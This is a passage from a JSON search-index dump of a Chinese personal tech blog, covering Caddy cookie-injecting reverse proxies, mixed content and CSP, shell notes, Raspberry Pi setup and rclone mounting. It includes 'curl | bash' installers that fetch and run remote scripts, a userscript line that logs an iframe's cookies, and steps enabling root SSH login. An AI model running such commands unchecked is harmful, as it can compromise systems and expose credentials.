\"\\\"${1:12:-1}\\\"\"\nsed -i -E \"s/header_upstream Cookie \\\".+\\\"/header_upstream Cookie \\\"${1:12:-1}\\\"/\" Caddyfile\nps aux | grep caddy | awk '{print $1}' | xargs kill -9\n./caddy\n```\n\ncaddy2 不知道要怎麼調整到反向代理到 https\n但是 caddy1 竟然可以輕鬆調整\n\ncaddy2 好處可以用 api 方式去調整設定 Server\n但是用瀏覽器做 AJAX caddy2 admin api 調整竟然會有 OPTIONS 過不去...\n最後想到用 sh 呼叫執行\n發現 caddy2 ~~不能~~不會調整反向代理到 https\n只能摸摸鼻子用 caddy1\n\n最後還是大失敗\n那個網站 Cookie 竟然是用 httponly\n這個是讓你沒辦法用 JS 控制有設定 httponly 的 Cookies ([浅谈Js 操作Cookie，以及HttpOnly 的限制 - 知乎](https://zhuanlan.zhihu.com/p/36197012))\n所以終究大失敗 QQ\n\n其實 Cookie httponly 感覺已可以寫一篇記錄\n因為還發現 Cookie 也可以針對 Path 去做發送 指定Cookie\n一直以為 Cookie 不是很安全，但 httponly 真的還滿安全\n\n\n\n\nCaddyfile\n```\nlocalhost:8881\ngzip\nlog test.log\n\nproxy / https://xxxxx/ {\nwebsocket\nheader_upstream -Referern\nheader_upstream -Server\nheader_upstream Cookie \"test=1572361464;a=xxx\"\n}\n\n```\n\ncaddyfile.json\n```json\n{\n  \"apps\": {\n    \"http\": {\n      \"servers\": {\n        \"proxy\": {\n          \"listen\": [\n            \":888\"\n          ],\n          \"routes\": [\n            {\n              \"handle\": [\n                {\n                  \"handler\": \"reverse_proxy\",\n                  \"headers\": {\n                    \"request\": {\n                      \"set\": {\n                        \"Host\": [\n                          \"{http.handlers.reverse_proxy.upstream.host}\"\n                        ],\n                        \"delete\": [\n                          \"Referern\",\n                          \"Server\"\n                        ],\n                        \"Cookie\": [\n                          \"test=test\"\n                        ]\n                      }\n                    }\n                  },\n                  \"transport\": {\n                    \"protocol\": \"tls\"\n                  },\n                  \"upstreams\": [\n                    {\n                      \"dial\": \"localhost:519\"\n                    }\n                  ]\n                }\n              ],\n              \"match\": [\n                {\n                  \"host\": [\n                    \"localhost\"\n                  ]\n                }\n              ]\n            }\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\nREG\n```\nREGEDIT4\n\n[HKEY_CLASSES_ROOT\\caddycurl]\n@=\"URL:caddycurl Protocol\"\n\"URL Protocol\"=\"\"\n\n[HKEY_CLASSES_ROOT\\caddycurl\\shell]\n\n[HKEY_CLASSES_ROOT\\caddycurl\\shell\\open]\n\n[HKEY_CLASSES_ROOT\\caddycurl\\shell\\open\\command]\n@=\"\\\"C:\\\\Program Files\\\\Git\\\\git-bash.exe\\\" \\\"/d/caddycurl.sh\\\" \\\"%1\\\"\"\n```\n\n\n番外中的番外 小記\n[python3.7安装后ssl问题-苏黎世1995的博客-51CTO博客](https://blog.51cto.com/13544424/2149473)\n[【Python】CentOs7 Python3安装Openssl以及解决ssl问题 - 梦琪小生 - 博客园](https://www.cnblogs.com/mqxs/p/9103031.html)","tags":["Web"],"categories":["Web"]},{"title":"對瀏覽器 混合內容（mixed content）的認識","url":"%2Fblog%2F2019%2F11%2F06%2F%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9%EF%BC%88mixed-content%EF%BC%89%E7%9A%84%E8%AA%8D%E8%AD%98%2F","content":"\n我們常常在改 https 的時候會發現，css 跟 js 沒有調成 https:// 或 //\n一些東西會沒有出來，正常 https 載 http (css js) 會失敗\n但是 http 載入 https 也會失敗(Firefox)\n\n<!--more-->\n\n## 簡單實驗\n\n```\n<html>\n<head>\n  <title>test</title>\n     <link rel=\"stylesheet\" href=\"http://xxxx/css/reset.css\">\n</head>\n<body>\nHello World!!\n</body>\n</html>\n\n```\n\n### http網頁 載 http js ,css (自動導 https)\n\n順利執行\n\n### http 網頁 載 https js css \n\n~~順利執行~~\nChrome 好像正常\n但 Firefox 會有問題\n\n\n### https 網頁 載 http js css\n\n已封鎖載入混和的主動內容「http://xxxx/css/reset.css」\n\n### https 網頁 載 https js css\n\n順利執行\n\n### 實驗簡單總結\n\n簡單說 https 模式下 不能讀 http 東西，因為不被信任\n可能會有網頁安全問題\n\n最佳使用方法`//xxxx/css/xxx.css`就不會有這個問題\n\n\n## 混合內容（mixed content）\n\n主動型混合有分兩種\n1. 被動/顯示型混合內容（mixed passive/display content）\n2. 主動型混合內容（mixed active content）\n\n### 被動/顯示型混合內容（mixed passive/display content）\n\n```\n被動型混合內容清單\n\n以下列出會被視為被動型混合內容的 HTTP 請求：\n\n    <img>（src 屬性）\n    <audio>（src 屬性）\n    <video>（src 屬性）\n    <object> subresource（如果 <object> 發起 HTTP 請求）\n```\n\n### 主動型混合內容（mixed active content）\n\n```\n主動型混合內容示例\n\n以下列出會被視為主動型混合內容的 HTTP 請求：\n\n    <script>（src 屬性）\n    <link>（href 屬性）（包含 CSS 樣式表）\n    <iframe>（src 屬性）\n    XMLHttpRequest 請求\n    fetch() 請求\n    所有用到 url 的 CSS 值（@font-face、cursor、background-image……等等）。\n    <object>（data 屬性）\n```\n\n### 簡單來說\n\n原本想說怎麼分可以載入根不可以載入，爬了一下文章，安全性比較小是可以取得到資源，危險信高的可能不能執行!!\n\n```\n現代瀏覽器\n\n現代瀏覽器（Chrome、Firefox、Safari、Microsoft Edge），基本上都遵守了 W3C 的 Mixed Content 規範，將 Mixed Content 分為 Optionally-blockable 和 Blockable 兩類：\n\nOptionally-blockable 類 Mixed Content 包含那些危險較小，即使被中間人篡改也無大礙的資源。現代瀏覽器默認會加載這類資源，同時會在控制台打印警告信息。這類資源包括：\n\n    通過 <img> 標籤加載的圖片（包括 SVG 圖片）；\n    通過 <video> / <audio> 和 <source> 標籤加載的視頻或音頻；\n    預讀的（Prefetched）資源；\n\n除此之外所有的 Mixed Content 都是 Blockable，瀏覽器必須禁止加載這類資源。所以現代瀏覽器中，對於 HTTPS 頁面中的 JavaScript、CSS 等 HTTP 資源，一律不加載，直接在控制台打印錯誤信息。\n```\n參考: [关于启用 HTTPS 的一些经验分享（一） | JerryQu 的小站](https://imququ.com/post/sth-about-switch-to-https.html)\n\n## 題外話 用 UserScript 方法\n\n```\nunsafeWindow.document.body.innerHTML+='<iframe src=\"https://xxxxxxxx\" width=\"640px\" height=\"400px\" frameborder=\"0\" scrolling=\"no\"></iframe>';\nconsole.log(unsafeWindow.frames[0].window.document.cookie);\n```\n\n## 掃 混合內容（mixed content）工具\n\n* [HTTPS Checker Desktop App | HTTPS Checker](https://httpschecker.net/guides/https-checker)\n* [GitHub - bramus/mixed-content-scan: Scan your HTTPS-enabled website for Mixed Content](https://github.com/bramus/mixed-content-scan)\n\n\n## 讓內容能正常執行和預防方法\n\n一開始我已為這跟 CROS 問題類似，但這個完全是不一樣的東西。\n但有類似解決方法。使用 CSP\n\n### CSP\n\n這個網頁講的很詳細 [Content Security Policy (CSP) 筆記 - HackMD](https://hackmd.io/@Eotones/BkOX6u5kX)\n\n可以簡單用 .htaccess 測試\n```\n<IfModule mod_headers.c>\nHeader set Content-Security-Policy \" \\\n    default-src 'self' xxxxxxx; \\\n    img-src 'self' data:; \\\n\"\n</IfModule>\n```\n\n任意網站可以使用 `default-src 'self' *`\n\n[Content-Security-Policy - HTTP Headers 的資安議題 (2) | DEVCORE 戴夫寇爾](https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/)\n\nhtml\n\n```\n<html>\n<head>\n  <title>test</title>\n     <link rel=\"stylesheet\" href=\"http://xxxxxxxxxxxxx/reset.css\">\n</head>\n<body>\nHello World!!\n<iframe  src=\"http://xxxxxxxxx/\" width=\"600\" height=\"100\" frameborder=\"0\" scrolling=\"no\"></iframe>\n</body>\n</html>\n~\n\n```\n\n\n### X-Frame-Options\n\niframe 所有 https 都能載入，不然不舊所有網站都可以任意被別的網站崁入?\n\n在 header 加 X-Frame-Options 設定\n就可以預防倒\n\nHeader always append X-Frame-Options SAMEORIGIN\n\n[X-Frame-Options 回應標頭 - HTTP | MDN](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Headers/X-Frame-Options)","tags":["Web"],"categories":["web"]},{"title":"PHP var_dump 輸出到變數的方法","url":"%2Fblog%2F2019%2F10%2F30%2FPHP-var-dump-%E8%BC%B8%E5%87%BA%E5%88%B0%E8%AE%8A%E6%95%B8%E7%9A%84%E6%96%B9%E6%B3%95%2F","content":"\n實務上 log 不是只會記在頁面上\n也會在 console 裡面\n\n<!--more-->\n\n```php\n<?php\nob_start();\nvar_dump($party);\n$result = ob_get_clean();\nLog::write('result => '. $result , \"xxxxxxx\" );\n```","tags":["var_dump"],"categories":["PHP"]},{"title":"Pulse Secure 不能使用，重新安裝方法","url":"%2Fblog%2F2019%2F10%2F24%2FPulse-Secure-%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8%EF%BC%8C%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%9D%E6%96%B9%E6%B3%95%2F","content":"\n最近用 VPN 連到公司網域\n但不明原因遠端只要關掉就打不開\n只有在重新開機開起 Pulse Secure 可以使用\n重開應用程式就不能了\n然後過了好幾天，我登入更新完後，就不能用了\n移除也移除不了...\n網路上看也沒有人解決 orz\n\n只好自己來!!!\n\n<!--more-->\n\n1.  移除應用程式，如果順利就重新安裝\n\n不能安裝就繼續往下做，我是遇到 他說 **PulseSecureService** 不能stopped\n我又看了一下服務，不能做設定。所以要想辦法移除\n但偏偏不能移除orz\n\n2.  sc.exe delete PulseSecureService，執行完需要重開機(PS: 我用powershell)\n\n3. 安裝[NTU SSL VPN](https://ccnet.ntu.edu.tw/vpn/for-windows.html)VPN程式\n\n不知道為什麼我用的VPN網頁裝下來不能用\n但是安裝這個就能順利執行\n\n希望看到的大家有解決問題!!\n\n\n","tags":["secure"],"categories":["Windows"]},{"title":"樹梅派(Raspberry PI)設定固定 IP 方法","url":"%2Fblog%2F2019%2F10%2F24%2F%E6%A8%B9%E6%A2%85%E6%B4%BE-Raspberry-PI-%E8%A8%AD%E5%AE%9A%E5%9B%BA%E5%AE%9A-IP-%E6%96%B9%E6%B3%95%2F","content":"\nRaspberry PI 設定小記\n因為最近中華 P883 偶爾連不到 Raspberry Pi\n重開 P883 就能使用\n不知道是不是在中華數據機設定就會很不穩\n所以我想改成設定在 PI 上面\n\n<!--more-->\n\n## 設在 Router 機器 vs 設定主機 好處\n\n一般有這兩種，各有優缺點\n\n假如 Router 機器掛掉，裡面資料 IP 有備份可能不用重新設定\n但需要買一樣的 數據機\n\n相反主機也是這個道理，目前我看我做網路朋友是選`設定主機`\n\n## 設定方法\n\n/etc/dhcpcd.conf\n```\ninterface eth0\nstatic ip_address=192.168.1.177\nstatic routers=192.168.1.1\nstatic domain_name_servers=192.168.1.1\n```\n\n## 以前方法\n\n還是紀錄一下\n\n######################\n/etc/network/interfaces\n######################\niface eth0 inet static\naddress x.x.x.x\nnetmask x.x.x.x\nnetwork x.x.x.x\nbroadcast x.x.x.x\ngateway x.x.x.x\n\n######################\n/etc/resolv.conf\n######################\nnameserver x.x.x.x\n\n參考來源:\n[葉難: Raspberry Pi：固定私有IP與dhcpcd](http://yehnan.blogspot.com/2016/05/raspberry-piipdhcpcd.html)\n[小狐狸事務所: 設定樹莓派區網固定 IP](http://yhhuang1966.blogspot.com/2019/02/ip.html)\n[將樹莓派 (Raspberry Pi) 的 eth0 / wlan0 網路介面設定固定 IP - 黃忠義 - Medium](https://medium.com/@chungyi410/%E5%B0%87-raspberry-pi-%E7%9A%84-eth0-%E7%B6%B2%E8%B7%AF%E4%BB%8B%E9%9D%A2%E8%A8%AD%E5%AE%9A%E5%9B%BA%E5%AE%9A-ip-43010aa3effb)","tags":["raspberry"],"categories":["Linux"]},{"title":"Shell Script 小記","url":"%2Fblog%2F2019%2F10%2F23%2FShell-Script-%E5%B0%8F%E8%A8%98%2F","content":"\n## shell 小記\n\n<!--more-->\n\n### 變數大寫\n\n```bash\nTODAY=`date +\"%Y%m%d\"`\nYESTERDAY=`date +\"%Y%m%d\"  --date=${TODAY}-1day`\n```\n\n## 變數宣告 = 不能有空白\n\n```bash\nA = 1234 # A: command not found\nB=1234   # Success\n```\n\n### 字串截取\n\n```bash\nSTRING=\"123456789\"\necho ${STRING:2:5}   # 34567\n```\n\n\n## Array 宣告\n\n```bash\nARR=(123 456 789)\necho ${ARR[2]}  # 789\necho ${#ARR[@]}  # Array length\n\nfor i in \"${ARR[@]}\"\ndo\n   echo \"$i\"\n   # or do whatever with individual element of the array\ndone\n```\n\n## Array join(合併) 動作\n\n```bash\nfunction join_by { local d=$1; shift; echo -n \"$1\"; shift; printf \"%s\" \"${@/#/$d}\"; }\n```\n\n[How can I join elements of an array in Bash? - Stack Overflow](https://stackoverflow.com/questions/1527049/how-can-i-join-elements-of-an-array-in-bash)\n\n\n## if 條件判斷\n\n```bash\nif [  ${#ERROR_ARR[@]} != 0 ]\nthen\n    echo xxxx\nfi\n```\n\n### 多個條件判斷\n\n```bash\nif [ -e $FIND_FILE_320 ] && [ -e $FIND_FILE_192 ] && [ -e $FIND_FILE_30 ] && [  -e $FIND_FILE_ALBUM ]\nthen\n    echo xxx\nfi\n```\n\n## mysql 查詢寫回變數\n\nFIND_ARRAY=(`mysql -h xxx.xx.xx.xx -D xxxx -u xxx -p__password__ -se \"SELECT xxx FROM xxx WHERE  limit 100\"`)\n\n* [shell处理mysql增、删、改、查 - 奔跑的Man - 博客园](https://www.cnblogs.com/iforever/p/4459857.html)\n* [shell中读写mysql数据库 | 赖明星](http://mingxinglai.com/cn/2013/01/use-mysql-in-shell/)\n* [bash - How concatenate strings with a newline - Stack Overflow](https://stackoverflow.com/questions/49819640/how-concatenate-strings-with-a-newline)\n\n```bash\nMYSQL_CMD=\"/usr/bin/mysql -u ga_user -pxxx -h xxx --database=xxx -s\"\nFIND_ARRAY=(`echo \"SELECT xxx FROM xxxx WHERE ... and ..... < DATE_ADD(now(),INTERVAL -3 DAY) ORDER BY id LIMIT 100\" | ${MYSQL_CMD}`)\n\nFIND_ARRAY=(`mysql -h xxx -D xxx -u xxx -pxxx -se \"SELECT xxx FROM xxx WHERE xxx and DATE_ADD(now(),INTERVAL -3 DAY) LIMIT 100\"`)\n```\n\n## function 宣告\n```bash\nfunction join_by { local d=$1; shift; echo -n \"$1\"; shift; printf \"%s\" \"${@/#/$d}\"; }\nERROR_SONG_ID_STRING=$(join_by , ${ERROR_SONG_ID[@]})\njoin_by , 1 2 3  \n```\n\n### function 還傳段行字串\n```bash\n#!/bin/bash\na_function() {\n    echo -e \"Hello\\nworld\\n 1\"\n    echo \"Hello\"\n    echo \"world\"\n    echo \"Hello\\nworld 4\"\n}\n\necho -e \"Hello\\nworld\\n 1\"\necho \"Hello\"\necho \"world\"\necho \"Hello\\nworld 4\"\n\nx=$(a_function \"x\")\necho \"x-no-quotes>\"\necho $x                       #No new lines!\necho \"<x-no-quotes\"\n\n```\n[scripting - How to debug a bash function that returns a value, and how to add newlines to a variable? - Stack Overflow](https://stackoverflow.com/questions/27872069/how-to-debug-a-bash-function-that-returns-a-value-and-how-to-add-newlines-to-a/27872114)\n\n### shell script 布林運算順序\n\n[shell script 布林運算順序 | 程式狂想筆記](http://localhost:4000/blog/2019/11/06/shell-script-%E5%B8%83%E6%9E%97%E9%81%8B%E7%AE%97%E9%A0%86%E5%BA%8F/)\n\n## 有關 * \n\n[linux bash / shell 有關 * 星號的事情 | 程式狂想筆記](https://malagege.github.io/blog/2020/01/21/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/)\n\n## shell 比較字串外面需要包\n\n> if 常常遇到`[: ==: unary operator expected`\n> \n> 那是因為 == 左邊沒有抓到值，或是值為 null\n> \n> 有兩種解決方法：\n> * if [ \"$app-running\" == \"\" ];\n> * if [[ $app-running == \"\" ]];\n\n參考:[Linux 的 shell script 中，遇到 unary operator expected 的解決方法](https://medium.com/micheh/linux-%E7%9A%84-shell-script-%E4%B8%AD-%E9%81%87%E5%88%B0-unary-operator-expected-%E7%9A%84%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95-3b4725d3fdf1)\n\n## 變數運算\n\n最近使用 shell 做回圈做`${index+1}`\n結果沒有印出來\n爬文有找到幾個方法\n\n1. declare -i來聲明整數變量\n```bash\nx=1\nx+=1\necho $x\n# 2\n```\n\n2. 使用let命令\n\n```bash\ni=1\nlet i+=1\necho $i\n# 2\n```\n\n3. 使用(())\n\n```bash\ni=1\n((++i))\necho $i\n# 2\n```\n\n4. 使用expr命令\n\n```bash\ni=1\ni=`expr $i + 1`\necho $i\n# 2\n```\n\n5. 使用$(())\n\n```bash\ni=1\ni=$(($i + 1))\necho $i\n# 2\n```\n\n6. 使用$[]\n\n```bash\ni=1\ni=$[$i + 1]\necho $i\n# 2\n```\n\n我比較喜歡 $(()) 和 (())\n\n參考來源: [Shell中整数自增的几种方式_杰瑞的专栏-CSDN博客](https://blog.csdn.net/Jerry_1126/article/details/52336340)\n\n## 複製檔案\n\n[cp 複製檔案可能沒注意的事情 | 程式狂想筆記](https://malagege.github.io/blog/2020/01/10/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/)\n\n## shell function 回傳只能數字\n\n一般我們看 shell script function return 回傳值只能是數字\n沒法回傳字串，仔細想想也滿有道理的\n因為正常程式執行結束會回傳 exit (int)\n要確定程式是否有正確執行完成 正常執行完成會回傳0\n\n那有沒有回傳字串方法\n我看到是用 function 裡面做 echo \n外面用`這個符號去包\n滿有趣的寫法\n\n\n## Shell 實作守護進程方法\n\nTODO: LINK \n\n## SHELL 大小寫\n\n[Bash lowercase and uppercase strings – Linux Hint](https://linuxhint.com/bash_lowercase_uppercase_strings/)\n\n## 在 Shell 腳本中解析選項 \n\n[在 Shell 腳本中解析選項 | 始終](https://liam.page/2016/11/11/ways-to-parse-arguments-in-shell-script/)\n\n## 相關連結\n[Shell——你只需要了解这么多 - 枣面包的博客 - CSDN博客](https://blog.csdn.net/weixin_37490221/article/details/80869792)\n[[Shell Script] Day27-提高可讀性之函式寫法(三) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10138639)\n[Linux Shell函数返回值 - 阳光岛主 - CSDN博客](https://blog.csdn.net/ithomer/article/details/7954577)","tags":["shell"],"categories":["Linux"]},{"title":"啟用樹梅派 root 帳號","url":"%2Fblog%2F2019%2F10%2F20%2F%E5%95%9F%E7%94%A8%E6%A8%B9%E6%A2%85%E6%B4%BE-root-%E5%B8%B3%E8%99%9F%2F","content":"\n最近要測試環境\n拿我手上沒在跑的樹梅派開 root\n沒想到有幾個流程\n因為不常做，所以小記一下\n\n<!--more-->\n\n1. sudo passwd root\n打密碼\n\n2. sudo passwd --unlock root\n\n3. sudo nano /etc/ssh/sshd_config\n我沒看到 PermitRootLogin without-password \n新增 PermitRootLogin yes\n\n4. reboot\n重開機\n\n這樣就能用 root 燈入了","tags":["linux"],"categories":["Linux"]},{"title":"Bash 和 sh 是不一樣的東西","url":"%2Fblog%2F2019%2F10%2F18%2FBash-%E5%92%8C-sh-%E6%98%AF%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E6%9D%B1%E8%A5%BF%2F","content":"\n最近使用 sh xxx.sh 出現這個錯誤`[[: not found`\n奇怪，我看語法正確怎麼會有問題\n原來發現 sh 跟 bash 是不一樣\n\n改用 bash xxx.sh 就能正常了\n\n<!--more-->\n\n> sh只是一個符號鏈接，最終指向是一個叫做dash的程序，自Ubuntu 6.10以後，系統的默認shell /bin/sh被改成了dash。dash(the Debian Almquist shell) 是一個比bash小很多但仍兼容POSIX標準的shell，它佔用的磁盤空間更少，執行shell腳本比bash更快，依賴的庫文件更少，當然，在功能上無法與bash相比。dash來自於NetBSD版本的Almquist Shell(ash)。\n> Ubuntu中將默認shell改為dash的主要原因是效率。由於Ubuntu啟動過程中需要啟動大量的shell腳本，為了優化啟動速度和資源使用情況，Ubuntu做了這樣的改動。\n> ————————————————\n> 版权声明：本文为CSDN博主「小猫的嵌入式」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。\n> 原文链接：https://blog.csdn.net/lucykingljj/article/details/48519069\n\nsh 沒有對應 2 個中誇號，所以才會報錯\n\n## 最佳執行 .sh 執行方法\n\n只要 xxx.sh 上面有放`#! /bin/sh`\n我們只要`./xxx.sh`就能順利執行了\n\n就這們簡單!!!!\n\n參考連結:\n* [Linux shell腳本執行提示錯誤\\[\\[: not found - lucykingljj的專欄 - CSDN博客](https://blog.csdn.net/lucykingljj/article/details/48519069)\n* [it.chinawin.net/os/article-8112.html](http://it.chinawin.net/os/article-8112.html)\n* [#!/usr/bin/env bash和#!/bin/bash区别 - 小硕成长空间 - CSDN博客](https://blog.csdn.net/ziyoudeyun1993/article/details/65627518)\n下面怕沒有時間寫，先預留連結\n* [Store mysql result in a bash array variable - Stack Overflow](https://stackoverflow.com/questions/35274597/store-mysql-result-in-a-bash-array-variable)\n* [shell script - How do I capture a MySQL result set in a bash array? - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/446748/how-do-i-capture-a-mysql-result-set-in-a-bash-array)\n* [How to Generate XML from XSD in Eclipse - JournalDev](https://www.journaldev.com/821/generate-xml-xsd-eclipse-java)\n* [Generating Instance Documents From XML Schemas - Help | PhpStorm](https://www.jetbrains.com/help/phpstorm/generating-instance-document-from-xml-schema.html)","tags":["sh"],"categories":["Linux"]},{"title":"rclone 掛載硬碟小記","url":"%2Fblog%2F2019%2F10%2F14%2Frclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98%2F","content":"\n最近公司有用 gcsfuse 做硬碟掛載\n突然想到之前有看到使用 rclone 的文章\n今天就小式了一下\n\n<!--more-->\n\n## 在 Window 掛載 rclone\n\n參考[使用 rclone 在 Windows 下挂载 Google 个人 / 团队云盘 - R 酱小窝](https://blog.rhilip.info/archives/874/)實作\n\n### 下載\n\nrclone ： https://rclone.org/downloads/\nwinfsp ： http://www.secfs.net/winfsp/download/\n\n**winfsp**一定要安裝，這個軟體跟掛載有關係\n\n## 設定\n\n`rclone config`\n\n參考: [Linux下rclone简单教程(支持VPS数据同步,多种网盘,支持挂载) | 半醉浮生丶](https://ymgblog.com/2018/03/09/296/)\n```\n\nroot@arm1:~# rclone config\n2018/06/12 15:36:43 NOTICE: Config file “/root/.config/rclone/rclone.conf” not found – using defaults\nNo remotes found – make a new one\nn) New remote\ns) Set configuration password\nq) Quit config\nn/s/q> n       **********************选择 n，新建配置文件\nname> test       **********************输入配置的名称\nType of storage to configure.\nChoose a number from below, or type in your own value\n1 / Alias for a existing remote\n\\ “alias”\n2 / Amazon Drive\n\\ “amazon cloud drive”\n3 / Amazon S3 Compliant Storage Providers (AWS, Ceph, Dreamhost, IBM COS, Minio)\n\\ “s3”\n4 / Backblaze B2\n\\ “b2”\n5 / Box\n\\ “box”\n6 / Cache a remote\n\\ “cache”\n7 / Dropbox\n\\ “dropbox”\n8 / Encrypt/Decrypt a remote\n\\ “crypt”\n9 / FTP Connection\n\\ “ftp”\n10 / Google Cloud Storage (this is not Google Drive)\n\\ “google cloud storage”\n11 / Google Drive\n\\ “drive”\n12 / Hubic\n\\ “hubic”\n13 / Local Disk\n\\ “local”\n14 / Mega\n\\ “mega”\n15 / Microsoft Azure Blob Storage\n\\ “azureblob”\n16 / Microsoft OneDrive\n\\ “onedrive”\n17 / Openstack Swift (Rackspace Cloud Files, Memset Memstore, OVH)\n\\ “swift”\n18 / Pcloud\n\\ “pcloud”\n19 / QingCloud Object Storage\n\\ “qingstor”\n20 / SSH/SFTP Connection\n\\ “sftp”\n21 / Webdav\n\\ “webdav”\n22 / Yandex Disk\n\\ “yandex”\n23 / http Connection\n\\ “http”\nStorage> 11       **********************这里是添加 googledrive 云盘，选择 11，当然你也可以添加其它云盘\nGoogle Application Client Id – leave blank normally.\nclient_id>       **********************回车留空即可\nGoogle Application Client Secret – leave blank normally.\nclient_secret>       **********************回车留空即可\nScope that rclone should use when requesting access from drive.\nChoose a number from below, or type in your own value\n1 / Full access all files, excluding Application Data Folder.\n\\ “drive”\n2 / Read-only access to file metadata and file contents.\n\\ “drive.readonly”\n/ Access to files created by rclone only.\n3 | These are visible in the drive website.\n| File authorization is revoked when the user deauthorizes the app.\n\\ “drive.file”\n/ Allows read and write access to the Application Data folder.\n4 | This is not visible in the drive website.\n\\ “drive.appfolder”\n/ Allows read-only access to file metadata but\n5 | does not allow any access to read or download file content.\n\\ “drive.metadata.readonly”\nscope>       **********************回车留空即可，这里是云盘 API 权限的设置\nID of the root folder – leave blank normally. Fill in to access “Computers” folders. (see docs).\nroot_folder_id>       **********************回车留空即可\nService Account Credentials JSON file path – leave blank normally.\nNeeded only if you want use SA instead of interactive login.\nservice_account_file>\nRemote config\nUse auto config?\n* Say Y if not sure\n* Say N if you are working on a remote or headless machine or Y didn’t work\ny) Yes\nn) No\ny/n> n       **********************输入 n，手动配置\nIf your browser doesn’t open automatically go to the following link: https://accounts.google.com/o/oauth2/auth?access_type=offline&client_id=20111111644.apps.googleusercontent.com&redirect_uri=urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob&response_type=code&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&state=1111111111111111111111       **********************在本地打开这个链接，添加 google 云盘账号授予 rclone 权限\nLog in and authorize rclone for access\nEnter verification code> 4/AAC8CPF21dYWqRnNSw479Fa8dUb11111111111111111111111111E       **********************输入在浏览器获取的认证 code\nConfigure this as a team drive?\ny) Yes\nn) No\ny/n> y       **********************是否团队云盘，我这里是，所以选择 Y\nFetching team drive list…\nChoose a number from below, or type in your own value\n1 / back\n\\ “0AAbWF01111111111”\n2 / back2\n\\ “0ABf3gOL111111111”\nEnter a Team Drive ID> 1       **********************选择一个你要添加的团队云盘\n——————–\n[test]\ntype = drive\nclient_id =\nclient_secret =\nscope =\nroot_folder_id =\nservice_account_file =\ntoken = {“access_token”:”ya29.GlvY1111qGBysX4tO_V5ZSO1PZ_Kq1111111111111111fksugvyOFC-MzvAPnl1rsi3OOwMFTdkk11111111H_u5zzPRp0eB_iLzKsZOVzP3R2ee1111AVmO”,”token_type”:”Bearer”,”refresh_token”:”1/r5Q_pH11111111CV-xiMne9_w62y_ag11bT_H9zz7qc”,”expiry”:”2018-06-12T16:37:16.714510063+08:00″}\nteam_drive = 0AA11111111111111\n——————–\ny) Yes this is OK\ne) Edit this remote\nd) Delete this remote\ny/e/d> y       **********************输入 y，配置到这里就完成了\nCurrent remotes:\n\nName Type\n==== ====\ntest drive\n\ne) Edit existing remote\nn) New remote\nd) Delete remote\nr) Rename remote\nc) Copy remote\ns) Set configuration password\nq) Quit config\ne/n/d/r/c/s/q> q       **********************输入 q 退出即可！\n```\n\n### 掛載\n\n```\nrclone mount gdrive:/ x: --cache-dir D:\\tmp --vfs-cache-mode writes\n# git bash\nrclone mount gdrive:/ x: --cache-dir /d/tmp --vfs-cache-mode writes\n```\n\n不知道為什麼我的 powershell 執行失敗...\n但用 Git bash 就可以順力執行\n\n### GUI\n\n另外，GUI 介面:[Releases · kapitainsky/RcloneBrowser](https://github.com/kapitainsky/RcloneBrowser/releases)\n這個我就沒有試了\n\n## 在 Raspberry Pi 掛載\n\n### 安裝\n\n```bash\n# raspberry pi \ncurl -L https://raw.github.com/pageauc/rclone4pi/master/rclone-install.sh | bash\n# normal(not raspberry pi)\ncurl https://rclone.org/install.sh | sudo bash\n```\n\n有看到`sudo apt install rclone`也可以使用，我沒有測試\n\nrclone config 就不再寫了，請看上面\n\n### 掛載\n\n**這邊需要注意權限問題**\n\n假如要掛載 `/mnt/xxx` 可能未因為 `user` 權限無法掛載\n可以使用家目錄 或者吧 `/mnt/xxx` 改成 777\n或者切換 `root` 做 mount\n\n```\nrclone mount --vfs-cache-mode writes --fast-list --vfs-cache-max-size 100M gdrive: /mnt/gdrive\n```\n有執行發現這一行不是背景執行...\n除了用`&`\n還發現有人用 tmux\n\n### Tmux\n\n```\ntmux # create tmux \ntmux ls # tmux ls\ntmux a -t 0# tmux session\nCtrl+b & d (關掉背景執行)\n```\n\n簡單說一下，`tmux`建立一個 session，做 mount 動做\n這時候會發現不能做任何動作，`Ctrl+b & d`會回到原始的 bash\n再輸入`tmux`，可以做`cp 動作到gdrive` 再`Ctrl+b & d`\n關掉 command line 連線都還會在\n`tmux ls`可以看到還有哪些 session 再跑\n\n因為指令不熟又不常用，之前用過的都忘了差不多\n有空再補...\n\n\n\n### 自動掛載\n\n假如用網路上範例\n路徑存放在`/etc/systemd/system/rclone.service`\n使用前建議用root掛載\n\n但聽說一般 user 也能設定\n我沒有仔細研究\n`~/.config/systemd/user/rclone@.service`\n\n改完記得要**systemctl daemon-reload**\n\n(還沒測試)\n```\n[Unit]\nDescription=rclone: Remote FUSE filesystem for cloud storage config %i\nDocumentation=man:rclone(1)[Service]\nType=notify\nExecStartPre=/bin/mkdir -p %h/mnt/%i\nExecStart= \\\n  /usr/bin/rclone mount \\\n    --fast-list \\\n    --vfs-cache-mode writes \\\n    --vfs-cache-max-size 100M \\\n    %i: %h/mnt/%i[Install]\nWantedBy=default.target\n```\n\n剛剛發現`--daemon`有這個，~~尚未測試~~測是這個可運作!!\n\n```\n[Unit]\nDescription=RClone Service\nAfter=network-online.target\nWants=network-online.target\n\n[Service]\nType=notify\nExecStart=/usr/sbin/rclone mount --allow-other 